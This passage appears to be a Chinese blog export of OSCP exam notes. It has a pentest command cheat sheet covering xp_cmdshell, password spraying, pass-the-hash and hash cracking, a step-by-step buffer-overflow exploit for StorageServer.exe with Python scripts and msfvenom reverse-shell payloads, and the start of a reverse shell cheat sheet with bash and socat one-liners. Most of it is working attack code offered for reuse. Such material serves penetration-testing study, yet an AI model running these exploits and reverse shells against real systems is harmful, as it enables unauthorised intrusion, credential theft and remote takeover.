<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">:set number   //显示行号</span><br><span class="line">/关键字   //向下查找</span><br><span class="line">?关键字   //向上查找</span><br><span class="line">输入关键字后按回车，按n跳到下一个，shift+n上一个</span><br></pre></td></tr></table></figure>

<p>windows找端口运行的程序</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netstat -ano | findstr 2233  //找端口对应的PID</span><br><span class="line">tasklist | findstr PID     //找PID对应的程序名</span><br><span class="line">dir /s xxx.exe   //找文件位置</span><br></pre></td></tr></table></figure>
<p>中文windows反弹shell后乱码问题：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chcp 65001   //在反弹的shell中输入</span><br></pre></td></tr></table></figure>

<p>docker逃逸：<a href="https://gtfobins.github.io/gtfobins/docker/" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/docker/</a><br>rbash逃逸：<a href="https://xz.aliyun.com/t/7642#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/7642#toc-3</a></p>
<p>OSCP笔记：<a href="https://fareedfauzi.gitbook.io/oscp-notes/" target="_blank" rel="noopener">https://fareedfauzi.gitbook.io/oscp-notes/</a><br>sqsh使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqsh -U 用户名 -P 密码 -S 服务器地址    //sqsh连接mssql</span><br></pre></td></tr></table></figure>

<p>windows短文件名表示法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dir /x  //可以看到短文件名</span><br></pre></td></tr></table></figure>
<p>mssql的hash文件位置及解密：<a href="https://blog.xpnsec.com/extracting-master-mdf-hashes/" target="_blank" rel="noopener">https://blog.xpnsec.com/extracting-master-mdf-hashes/</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\DATA\master.mdf   //该文件可以解密</span><br><span class="line">C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\Backup\master.mdf    //备份后位置</span><br></pre></td></tr></table></figure>
<p>开启mssql的xp_cmdshell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">开启开启xp_cmdshell</span><br><span class="line">exec sp_configure &apos;show advanced options&apos;, 1;</span><br><span class="line">reconfigure;</span><br><span class="line">exec sp_configure &apos;xp_cmdshell&apos;,1;</span><br><span class="line">reconfigure;</span><br></pre></td></tr></table></figure>
<p>查看smb版本，实用！</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1st ：ngrep -i -d tap0 &apos;s.?a.?m.?b.?a.*[[:digit:]]&apos; port 139   </span><br><span class="line">2nd ：echo exit | smbclient -L [IP]</span><br></pre></td></tr></table></figure>

<p>linux反弹shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>查看网卡信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat /etc/sysconfig/network-scripts/ifcfg-eth0</span><br></pre></td></tr></table></figure>
<p>改进版nmap扫描命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -F -T4 -Pn --top-ports 1000 xx.xx.xx.xx   //快速扫描</span><br><span class="line">nmap -A -Pn -vv -open -T4 --script vuln -p- x.x.x.x  --dns-server 10.x.x.x   //全扫描</span><br><span class="line">nmap -sU -O -p-  10.x.x.x  //UDP扫描</span><br></pre></td></tr></table></figure>

<p>linux提权searchsploit</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">searchsploit linux kernel 4.4.0-116    //搜索提权</span><br></pre></td></tr></table></figure>

<p>john解密</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">john hash --wordlist=/usr/share/wordlist/rockyou.txt</span><br></pre></td></tr></table></figure>

<p>开启apache http服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/etc/init.d/apache2 start    //路径在常规/var/www/html</span><br></pre></td></tr></table></figure>
<p>pl的提权建议脚本真好用！<a href="https://github.com/jondonas/linux-exploit-suggester-2" target="_blank" rel="noopener">https://github.com/jondonas/linux-exploit-suggester-2</a><br>升级交互式tty文章：<a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/" target="_blank" rel="noopener">https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/</a></p>
<p>msf自带提权建议</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use multi/recon/local_exploit_suggester  //提权建议</span><br></pre></td></tr></table></figure>
<p>密码喷射：<a href="https://github.com/dafthack/DomainPasswordSpray" target="_blank" rel="noopener">https://github.com/dafthack/DomainPasswordSpray</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell.exe -exec bypass</span><br><span class="line">Import-Module DomainPasswordSpray.ps1</span><br><span class="line">Invoke-DomainPasswordSpray -Password Spring2017password</span><br></pre></td></tr></table></figure>

<p>psexec.py使用方法1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">psexec.py -hashes xxxxx:xxxxx domain.com/username@10.x.x.x cmd   //最后cmd为开启cmdshell。也可换成whoami等命令   //也可不用hash用密码   //注意斜杠不是反斜杠</span><br></pre></td></tr></table></figure>
<p>pth-winexe使用方法1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pth-winexe -U domain.com/username%password or hash //10.x.x.x ipconfig</span><br></pre></td></tr></table></figure>

<p>rdesktop共享文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rdesktop 10.x.x.x -r disk:aaa=/home/username/</span><br></pre></td></tr></table></figure>

<p>john爆破kirbi密码（krb5tgs类型）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">john --format=krb5tgs hash.txt --wordlist=/usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
<p>老版本的mimikatz抓hash（但凡新版本出现error：key import就用老版本试试）</p>
<p>多关注web中的JS、中间件的信息、ID靠后的的linux用户！</p>
<p>善用google</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当ssh出现</span><br><span class="line">Unable to negotiate with 10.11.1.141 port 21: n0 matching key exchange method found,Their offer: dffie-hellman-group-exchange-sha1, iffie-hellman-group14-sha1,diffie-hellman-group1-sha1</span><br><span class="line">错误的时候，可以在~/.ssh/config里添加：</span><br><span class="line">Host 10.11.1.136</span><br><span class="line">        KexAlgorithms +diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1</span><br></pre></td></tr></table></figure>

<p>具有suid位的二进制程序，可以看看其中ascll码说明了什么东西</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strings xxx</span><br></pre></td></tr></table></figure>
<p>如果其中有命令的话可以替换对应命令</p>
<p>nmap枚举漏洞</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script=(对应的服务)* -p(对应的端口)  xx.x.x.x</span><br></pre></td></tr></table></figure>
<p>dirtycow脏牛提权时，最好有普通用户权限，不然有cc1莫名错误<br>好用的dirtycow脏牛链接<br><a href="https://github.com/FireFart/dirtycow/blob/master/dirty.c" target="_blank" rel="noopener">https://github.com/FireFart/dirtycow/blob/master/dirty.c</a><br>两种脏牛exp<br><img src="https://i.loli.net/2021/02/18/4wjFT5EtW1R36kD.png" alt="Image 2.png"></p>
<p>传输文件得用443端口<br>Mysql UDF提权：<a href="https://github.com/1N3/PrivEsc/blob/master/mysql/raptor_udf2.c" target="_blank" rel="noopener">https://github.com/1N3/PrivEsc/blob/master/mysql/raptor_udf2.c</a></p>
<p>wget 可以不带http头</p>
<p>windows经典提权（不安全的文件权限）</p>
<p>hashcat解密方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat -a 0 /usr/share/wordlists/rockyou.txt -m 1600 1 --show</span><br></pre></td></tr></table></figure>















]]></content>
      <tags>
        <tag>OSCP</tag>
      </tags>
  </entry>
  <entry>
    <title>OSCP溢出题步骤</title>
    <url>/2021/02/18/OSCP%E6%BA%A2%E5%87%BA%E9%A2%98%E6%AD%A5%E9%AA%A4/</url>
    <content><![CDATA[<p>这是在做OSCP过程中总结出来的新手照搬步骤。</p><a id="more"></a>
<h4 id="复现崩溃"><a href="#复现崩溃" class="headerlink" title="复现崩溃"></a>复现崩溃</h4><p>运行目标程序（找出端口），尝试发送大字符串观察程序是否崩溃</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">filler = &quot;A&quot;*2400   //二分法找到境界值</span><br><span class="line">buffer=[filler]</span><br><span class="line"></span><br><span class="line">for string in buffer:                                                                                                                                                                                                                      </span><br><span class="line">    print &quot;Fuzzing with %s bytes&quot; % len(string)                                                                                                                                                                                 </span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)                                                                                                                                                                                     </span><br><span class="line">    connect=s.connect((&apos;192.168.17.141&apos;,2233))                                                                                                                                                                                             </span><br><span class="line">    s.send((string))                                                                                                                                                                                                                       </span><br><span class="line">    s.close()</span><br></pre></td></tr></table></figure>
<p>根据1.py脚本，以二分法的方式找出程序崩溃的零界值（这里发现2300不崩溃，但是2400崩溃了）</p>
<p><img src="https://i.loli.net/2021/02/18/o4Gg7miVwcRtDQu.png" alt="clipboard.png"></p>
<p><img src="https://i.loli.net/2021/02/18/ngjZ9yKGohXl8cV.png" alt="clipboard.png"></p>
<h4 id="寻找EIP"><a href="#寻找EIP" class="headerlink" title="寻找EIP"></a>寻找EIP</h4><p>尝试找到崩溃的具体长度。使用msf中的pattern_create模块生成字符，方便定位</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit    //工具路径</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/02/18/s4Xdg1bQPAIB8uk.png" alt="clipboard.png"></p>
<p>将其放入2.py的filler中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">filler = &quot;A***********&quot;    //修改</span><br><span class="line">buffer=[filler]</span><br><span class="line"></span><br><span class="line">for string in buffer:</span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) </span><br><span class="line">    connect=s.connect((&apos;192.168.17.141&apos;,2233))</span><br><span class="line">    s.send((string))</span><br><span class="line">    s.close()</span><br></pre></td></tr></table></figure>

<p>管理员运行目标程序和Immunity Debugger（之后重新载入都需要管理员运行）<br>Immunity Debugger进入file-&gt;Attach-&gt;选择目标程序-&gt;点击运行按钮（右下角变为running）（载入步骤，同下“重新载入”）<br>运行2.py发现Immunity Debugger右下角变为黄色的Paused，表明程序崩溃了</p>
<p><img src="https://i.loli.net/2021/02/18/8VoAnyTuFBmpcOs.png" alt="clipboard.png"></p>
<p>观察EIP值，使用pattern_offfset工具定位</p>
<p><img src="https://i.loli.net/2021/02/18/7EbMoSzRJF9apmV.png" alt="clipboard.png"></p>
<h4 id="验证EIP"><a href="#验证EIP" class="headerlink" title="验证EIP"></a>验证EIP</h4><p>修改 3.py</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">filler = &quot;A&quot;*2306    //修改</span><br><span class="line">eip = &quot;B&quot;*4    //添加B字符先占位子</span><br><span class="line">offset = &quot;C&quot;*16  //添加C字符先占位子测试</span><br><span class="line"></span><br><span class="line">buffer= [filler + eip + offset]</span><br><span class="line"></span><br><span class="line">for string in buffer:</span><br><span class="line">    print &quot;Fuzzing with %s bytes&quot; % len(string)</span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) </span><br><span class="line">    connect=s.connect((&apos;192.168.17.141&apos;,2233))</span><br><span class="line">    s.send((string))</span><br><span class="line">    s.close()</span><br></pre></td></tr></table></figure>
<p>重新载入目标程序，运行3.py发现debugger程序Paused<br>观察EIP，若为42424242（B字符的ascll码）表明程序确实溢出了且可控！</p>
<p><img src="https://i.loli.net/2021/02/18/wdyiP7AnuIOtk5J.png" alt="clipboard.png"></p>
<p>观察上图ESP的值为0295EE6C，对应上图下框第3行C，表明下一步到达地址，所以我们需要修改offset的值为8去填补中间隔的8位<br>脚本修该如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#coding: utf-8</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">filler = &quot;A&quot;*2306</span><br><span class="line">eip = &quot;B&quot;*4</span><br><span class="line">offset = &quot;C&quot;*8    //修改处</span><br><span class="line"></span><br><span class="line">buffer= [filler + eip + offset]</span><br><span class="line"></span><br><span class="line">for string in buffer:</span><br><span class="line">    print &quot;Fuzzing with %s bytes&quot; % len(string)</span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) </span><br><span class="line">    connect=s.connect((&apos;192.168.17.141&apos;,2233))</span><br><span class="line">    s.send((string))</span><br><span class="line">    s.close()</span><br></pre></td></tr></table></figure>

<h4 id="查看shellcode空间是否足够（扩容测试）"><a href="#查看shellcode空间是否足够（扩容测试）" class="headerlink" title="查看shellcode空间是否足够（扩容测试）"></a>查看shellcode空间是否足够（扩容测试）</h4><p>一般我们的shellcode大小在300-400左右，但是有时候怕空间不够shellcode被截断就需要测试<br>我们现在的字符大小为：A<em>2306+B</em>4+C*8=2318 再加上可能需要的shellcode大小为400 就是等于2718。奢侈一点算3000<br>修改4.py如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#coding: utf-8</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">filler = &quot;A&quot;*2306</span><br><span class="line">eip = &quot;B&quot;*4</span><br><span class="line">offset = &quot;C&quot;*8</span><br><span class="line">buf = &quot;D&quot;*(3000-len(filler)-len(eip)-len(offset))    //添加，测试空间大小</span><br><span class="line"></span><br><span class="line">buffer= [filler + eip + offset + buf]</span><br><span class="line"></span><br><span class="line">for string in buffer:</span><br><span class="line">    print &quot;Fuzzing with %s bytes&quot; % len(string)</span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) </span><br><span class="line">    connect=s.connect((&apos;192.168.17.141&apos;,2233))</span><br><span class="line">    s.send((string))</span><br><span class="line">    s.close()</span><br></pre></td></tr></table></figure>

<p>全部重新载入程序后运行4.py</p>
<p><img src="https://i.loli.net/2021/02/18/Zy1dmOX3HV2IGKD.png" alt="clipboard.png"></p>
<p>发现程序Paused<br>查看EIP对应地址是否任然为B(42)</p>
<p><img src="https://i.loli.net/2021/02/18/AYG8lEK3FhgyCUk.png" alt="clipboard.png"></p>
<p>查看4B下面是否为恰好的8个C，查看ESP对应地址是否为D</p>
<p><img src="https://i.loli.net/2021/02/18/8UBf6gcEeyoKTbp.png" alt="clipboard.png"></p>
<p>查看最后一行D地址为：02A6F110</p>
<p><img src="https://i.loli.net/2021/02/18/aSyU9hLrlkKpwZv.png" alt="clipboard.png"></p>
<p>查看第一行D地址为：02A6EE6C</p>
<p><img src="https://i.loli.net/2021/02/18/uWsBo21pgakAPX4.png" alt="clipboard.png"></p>
<p>计算最后一行D至第一行D的空间：02A6EE6C-02A6F110=676（10进制）</p>
<p><img src="https://i.loli.net/2021/02/18/guX9cyBMzGDHLs4.png" alt="clipboard.png"></p>
<p>676大小足够shellcode了</p>
<h4 id="寻找坏字符badchars"><a href="#寻找坏字符badchars" class="headerlink" title="寻找坏字符badchars"></a>寻找坏字符badchars</h4><p>重新载入程序，使用5.py致使Paused</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#coding: utf-8</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">filler = &quot;A&quot;*2306</span><br><span class="line">eip = &quot;B&quot;*4</span><br><span class="line">offset = &quot;C&quot;*8</span><br><span class="line">badchars = &quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span><br><span class="line"></span><br><span class="line">buffer= [filler + eip + offset + badchars]</span><br><span class="line"></span><br><span class="line">for string in buffer:</span><br><span class="line">    print &quot;Fuzzing with %s bytes&quot; % len(string)</span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) </span><br><span class="line">    connect=s.connect((&apos;192.168.17.141&apos;,2233))</span><br><span class="line">    s.send((string))</span><br><span class="line">    s.close()</span><br></pre></td></tr></table></figure>

<p>选择ESP地址，右键选择Follow in Dump<br><img src="https://i.loli.net/2021/02/18/nqi56IXGtjQBPpd.png" alt="clipboard.png"></p>
<p>在左下角框使用16位16进制方便查看</p>
<p><img src="https://i.loli.net/2021/02/18/Y3PWxgSNOUkMayb.png" alt="clipboard.png"></p>
<p>观察从什么位置中断（正常应为01-FF）</p>
<p><img src="https://i.loli.net/2021/02/18/jTSmRAXWYha9KpZ.png" alt="clipboard.png"></p>
<p>此处为51处中断，则在5.py的badchars中删除\x51，再次测试寻找坏字符直至所有坏字符找出，该程序坏字符为\x00、\x51（\x00默认为坏字符）</p>
<h4 id="查找jmp-esp"><a href="#查找jmp-esp" class="headerlink" title="查找jmp esp"></a>查找jmp esp</h4><p>接着使用上面的Debugger（不需要重新载入）<br>在最下面白框处输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">!mona modules</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/02/18/Uf3sM4VlHLIEDmY.png" alt="clipboard.png"></p>
<p><img src="https://i.loli.net/2021/02/18/eOYIznkg8Hsr7l2.png" alt="clipboard.png"></p>
<p>寻找前4位为false的程序或dll（一般都为目标程序或者目标程序自带的dll，也有可能是系统dll）(oscp中会随漏洞程序文件夹中放入一个dll文件，选择它就对了！)<br>白框处再次输入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">!mona find -s &quot;\xff\xe4&quot; -m StorageServer.exe   //修改最后选择的程序、dll即可  // &quot;\xff\xe4&quot;就是jmp esp字节码</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/02/18/CMJgdn7XlioWPYk.png" alt="clipboard.png"></p>
<p>查看results，结果显示jmp esp 地址为1120110d（有多个一般选择第一个或者最贴近目标程序的那一个）</p>
<h4 id="确认esp"><a href="#确认esp" class="headerlink" title="确认esp"></a>确认esp</h4><p>重新载入程序，点击跳转按钮，填入上面找到的jmp esp地址</p>
<p><img src="https://i.loli.net/2021/02/18/n7GsMATVRhKcxbw.png" alt="clipboard.png"></p>
<p>发现的确为jmp esp指令</p>
<p><img src="https://i.loli.net/2021/02/18/i4UOmoBZgd3spS7.png" alt="clipboard.png"></p>
<p>在该指令处“F2”下断点，点击“运行”按钮<br>修改6.py中eip地址（注意是倒着写），并运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#coding: utf-8</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">filler = &quot;A&quot;*2306</span><br><span class="line">eip = &quot;\x0d\x11\x20\x11&quot;    //修改</span><br><span class="line">offset = &quot;C&quot;*8</span><br><span class="line">buf = &quot;D&quot;*(3000-len(filler)-len(eip)-len(offset))</span><br><span class="line"></span><br><span class="line">buffer= [filler + eip + offset + buf]</span><br><span class="line"></span><br><span class="line">for string in buffer:</span><br><span class="line">    print &quot;Fuzzing with %s bytes&quot; % len(string)</span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) </span><br><span class="line">    connect=s.connect((&apos;192.168.17.141&apos;,2233))</span><br><span class="line">    s.send((string))</span><br><span class="line">    s.close()</span><br></pre></td></tr></table></figure>
<p>发现程序Paused，并且EIP指向我们的目标程序StorageServer.exe（上面选择的哪个jmp esp程序就应该显示哪个，该处是目标exe程序）</p>
<p><img src="https://i.loli.net/2021/02/18/LwsRi7XmHcqAYgt.png" alt="clipboard.png"></p>
<p>使用“F7”步入发现EIP指向ESP 为正确结果</p>
<p><img src="https://i.loli.net/2021/02/18/kV6mKIUbyN1BCDj.png" alt="clipboard.png"></p>
<h4 id="生成shellcode"><a href="#生成shellcode" class="headerlink" title="生成shellcode"></a>生成shellcode</h4><p>官方使用的参数如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.17.137 LPORT=443  –e x86/shikata_ga_nai -b &quot;\x00\x51&quot; EXITFUNC=thread -f c</span><br></pre></td></tr></table></figure>
<p>但是经过测试该程序不适合使用这个payload（需要根据实际情况生成）<br>该程序使用的payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.17.137 LPORT=443  –e x86/shikata_ga_nai -b &quot;\x00\x51&quot; EXITFUNC=thread -f c</span><br></pre></td></tr></table></figure>

<p>编写7.py加入nops（\x90为nop指令，避免上面字符干扰shellcode，一般12就够了），并且将生成的shellcode写入exp</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#coding: utf-8</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">filler = &quot;A&quot;*2306</span><br><span class="line">eip = &quot;\x0d\x11\x20\x11&quot;</span><br><span class="line">offset = &quot;C&quot;*8</span><br><span class="line">nops = &quot;\x90&quot;*12    //添加</span><br><span class="line">exp = ( &quot;\xdd\xc2\xbe\xee\xc4\x38\x15\xd9\x74\x24\xf4\x58\x33\xc9\xb1&quot;)      //生成的shellcode</span><br><span class="line">buf = &quot;D&quot;*(3000-len(filler)-len(eip)-len(offset)-len(nops)-len(exp))</span><br><span class="line"></span><br><span class="line">buffer= [filler + eip + offset + nops +exp + buf]</span><br><span class="line"></span><br><span class="line">for string in buffer:</span><br><span class="line">    print &quot;Fuzzing with %s bytes&quot; % len(string)</span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) </span><br><span class="line">    connect=s.connect((&apos;192.168.17.141&apos;,2233))</span><br><span class="line">    s.send((string))</span><br><span class="line">    s.close()</span><br></pre></td></tr></table></figure>
<p>msf开启监听，重新管理员运行目标程序，运行脚本发现可反弹shell</p>
<p><img src="https://i.loli.net/2021/02/18/fw6CS1gbmQJtxTj.png" alt="clipboard.png"></p>
<hr>
<p>下面也附上官方POC脚本格式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">try:</span><br><span class="line"> print &quot;\nSending evil buffer...&quot;</span><br><span class="line"> filler = &quot;A&quot; * 2306</span><br><span class="line"> eip = &quot;\x0d\x11\x20\x11&quot;</span><br><span class="line"> offset = &quot;C&quot; * 4</span><br><span class="line"> nops = &quot;\x90&quot; * 10</span><br><span class="line">  shellcode = (&quot;\x&quot;)</span><br><span class="line">  </span><br><span class="line"> buffer = filler + eip + offset + nops + shellcode</span><br><span class="line"></span><br><span class="line"> s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"> s.connect((&quot;192.168.17.139&quot;, 2233))</span><br><span class="line"> s.send(buffer)</span><br><span class="line"> s.close()</span><br><span class="line"> print &quot;\nDone did you get a reverse shell?&quot;</span><br><span class="line">except:</span><br><span class="line"> print &quot;\nCould not connect!&quot;</span><br></pre></td></tr></table></figure>

<p>注意，最后shellcode的payload的选择需要多试试，在oscp靶场中windows/shell_reverse_tcp适用，但另外一个不适用，在本地win7里windows/meterpreter/reverse_tcp适用，另外一个不适用</p>
]]></content>
      <tags>
        <tag>OSCP</tag>
      </tags>
  </entry>
  <entry>
    <title>ReverseShell清单</title>
    <url>/2020/11/27/ReverseShell%E6%B8%85%E5%8D%95/</url>
    <content><![CDATA[<h1 id="Reverse-Shell-Cheat-Sheet"><a href="#Reverse-Shell-Cheat-Sheet" class="headerlink" title="Reverse Shell Cheat Sheet"></a>Reverse Shell Cheat Sheet</h1><a id="more"></a><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><ul>
<li><a href="#reverse-shell">Reverse Shell</a><ul>
<li><a href="#awk">Awk</a></li>
<li><a href="#bash-tcp">Bash TCP</a></li>
<li><a href="#bash-udp">Bash UDP</a></li>
<li><a href="#c">C</a></li>
<li><a href="#golang">Golang</a></li>
<li><a href="#groovy-alternative-1">Groovy Alternative 1</a></li>
<li><a href="#groovy">Groovy</a></li>
<li><a href="#java-alternative-1">Java Alternative 1</a></li>
<li><a href="#java-alternative-2">Java Alternative 2</a></li>
<li><a href="#java">Java</a></li>
<li><a href="#lua">Lua</a></li>
<li><a href="#ncat">Ncat</a></li>
<li><a href="#netcat-openbsd">Netcat OpenBsd</a></li>
<li><a href="#netcat-traditional">Netcat Traditional</a></li>
<li><a href="#nodejs">NodeJS</a></li>
<li><a href="#openssl">OpenSSL</a></li>
<li><a href="#perl">Perl</a></li>
<li><a href="#php">PHP</a></li>
<li><a href="#powershell">Powershell</a></li>
<li><a href="#python">Python</a></li>
<li><a href="#ruby">Ruby</a></li>
<li><a href="#socat">Socat</a></li>
<li><a href="#war">War</a></li>
</ul>
</li>
<li><a href="#meterpreter-shell">Meterpreter Shell</a><ul>
<li><a href="#windows-staged-reverse-tcp">Windows Staged reverse TCP</a></li>
<li><a href="#windows-stageless-reverse-tcp">Windows Stageless reverse TCP</a></li>
<li><a href="#linux-staged-reverse-tcp">Linux Staged reverse TCP</a></li>
<li><a href="#linux-stageless-reverse-tcp">Linux Stageless reverse TCP</a></li>
<li><a href="#other-platforms">Other platforms</a></li>
</ul>
</li>
<li><a href="#spawn-tty-shell">Spawn TTY Shell</a></li>
<li><a href="#references">References</a></li>
</ul>
<h2 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell</h2><h3 id="Bash-TCP"><a href="#Bash-TCP" class="headerlink" title="Bash TCP"></a>Bash TCP</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/4242 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">0&lt;&amp;196;<span class="built_in">exec</span> 196&lt;&gt;/dev/tcp/10.0.0.1/4242; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure>

<h3 id="Bash-UDP"><a href="#Bash-UDP" class="headerlink" title="Bash UDP"></a>Bash UDP</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Victim:</span><br><span class="line">sh -i &gt;&amp; /dev/udp/10.0.0.1/4242 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">Listener:</span><br><span class="line">nc -u -lvp 4242</span><br></pre></td></tr></table></figure>

<p>Don’t forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash</p>
<h3 id="Socat"><a href="#Socat" class="headerlink" title="Socat"></a>Socat</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">user@attack$ socat file:`tty`,raw,echo=<span class="number">0</span> TCP-L:<span class="number">4242</span></span><br><span class="line">user@victim$ /tmp/socat exec:<span class="string">'bash -li'</span>,pty,stderr,setsid,sigint,sane tcp:<span class="number">10.0</span>.<span class="number">0.1</span>:<span class="number">4242</span></span><br></pre></td></tr></table></figure>
